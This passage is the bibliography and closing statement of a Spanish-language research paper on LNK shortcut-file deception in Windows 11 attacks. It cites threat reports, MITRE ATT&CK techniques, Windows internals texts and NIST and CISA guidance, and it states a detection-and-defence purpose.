- Mandiant (2022). *"APT29: Advanced Delivery Mechanisms and LNK Abuse."*
- Microsoft DTAC (2023). *"LNK File Abuse: Taxonomy and Detection."*
- Elastic Security Labs (2023). *"LNK File Stomping: Discrepancies Between Parsers."*

### MITRE ATT&CK

- MITRE ATT&CK (2024). *Technique T1204.002: User Execution — Malicious File.*
- MITRE ATT&CK (2024). *Technique T1036.001: Masquerading — Invalid Code Signature.*
- MITRE ATT&CK (2024). *Technique T1036.010: Masquerading — Masquerade File Type.*
- MITRE ATT&CK (2024). *Technique T1202: Indirect Command Execution.*

### Sistemas Operativos y Kernel NT

- Russinovich, M., Solomon, D., & Ionescu, A. (2021). *Windows Internals*, 7th Edition. Microsoft Press.
- Nebbett, G. (2000). *Windows NT/2000 Native API Reference*. Sams Publishing.

### Detección y Respuesta

- NIST SP 800-83 (2013). *Guide to Malware Incident Prevention and Handling.*
- NIST SP 800-53 (2020). *Security and Privacy Controls for Information Systems and Organizations.* Rev. 5.
- CISA (2023). *Defending Against Malicious Documents and Shortcuts.* Advisory AA23-.

---

*Documento de investigación técnica sobre el vector de decepción mediante archivos LNK en la Etapa 2 del ataque compuesto de 5 etapas contra Windows 11. El análisis se limita a la descripción objetiva del fenómeno desde la perspectiva de la semiótica formal, la teoría de la información y los modelos cognitivos, con el propósito de fundamentar mecanismos de detección y defensa.*
